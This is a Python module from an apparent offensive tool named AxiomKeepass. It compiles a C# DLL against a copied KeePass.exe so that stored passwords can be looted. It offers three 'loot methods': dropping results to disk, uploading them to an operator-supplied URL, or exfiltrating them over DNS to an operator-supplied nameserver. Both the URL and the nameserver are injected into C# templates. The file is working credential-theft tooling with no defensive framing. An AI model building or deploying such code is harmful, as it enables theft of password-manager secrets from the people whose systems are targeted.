#!/usr/bin/python3

import os
import subprocess

from axiom_keepass.core.parse_args import AxiomArgParser
from axiom_keepass.client.upload import upload

def compile_dll(smbClient, tmp_dir: str, thread_index: int):
    args = AxiomArgParser.GetProgramArgs()

    match args.loot_method:
        case "disk-drop":
            subprocess.run([
                "mcs",
                "-platform:x64",
                "-nowarn:1685",
                f"-out:{tmp_dir}/AxiomKeepass.dll",
                f"-r:{tmp_dir}/KeePass.exe",
                f"-r:{os.path.dirname(__file__)}/../../Binaries/System.Windows.Forms.dll",
                f"-r:{os.path.dirname(__file__)}/../../Binaries/System.Security.dll",
                "-target:library",
                f"{os.path.dirname(__file__)}/../../Assembly/AxiomKeepass_dropdisk.cs",
                f"{os.path.dirname(__file__)}/../../Assembly/AssemblyInfo.cs"
            ])
        case "upload":
            template = open(f"{os.path.dirname(__file__)}/../../Assembly/AxiomKeepass_upload.cs", "r")
            template_data = template.read()
            template.close()

            final_file = open(f"{tmp_dir}/AxiomKeepass_upload.cs", "w")
            final_file.write(template_data.replace("{{URL_HERE}}", args.upload_to))
            final_file.close()

            subprocess.run([
                "mcs",
                "-platform:x64",
                "-nowarn:1685",
                f"-out:{tmp_dir}/AxiomKeepass.dll",
                f"-r:{tmp_dir}/KeePass.exe",
                f"-r:{os.path.dirname(__file__)}/../../Binaries/System.Windows.Forms.dll",
                f"-r:{os.path.dirname(__file__)}/../../Binaries/System.Security.dll",
                f"-r:{os.path.dirname(__file__)}/../../Binaries/System.Net.Http.dll",
                "-target:library",
                f"{tmp_dir}/AxiomKeepass_upload.cs",
                f"{os.path.dirname(__file__)}/../../Assembly/AssemblyInfo.cs"
            ])
        case "dns":
            template = open(f"{os.path.dirname(__file__)}/../../Assembly/AxiomKeepass_dns.cs", "r")
            template_data = template.read()
            template.close()

            final_file = open(f"{tmp_dir}/AxiomKeepass_dns.cs", "w")
            final_file.write(template_data.replace("{{NAMESERVER_HERE}}", args.nameserver))
            final_file.close()

            subprocess.run([
                "mcs",
                "-platform:x64",
                "-nowarn:0168,1685",
                f"-out:{tmp_dir}/AxiomKeepass.dll",
                f"-r:{tmp_dir}/KeePass.exe",
                f"-r:{os.path.dirname(__file__)}/../../Binaries/System.Windows.Forms.dll",
                f"-r:{os.path.dirname(__file__)}/../../Binaries/System.Security.dll",
                f"-r:{os.path.dirname(__file__)}/../../Binaries/System.Net.Http.dll",
                "-target:library",
                f"{tmp_dir}/AxiomKeepass_dns.cs",
                f"{os.path.dirname(__file__)}/../../Assembly/AssemblyInfo.cs"
            ])

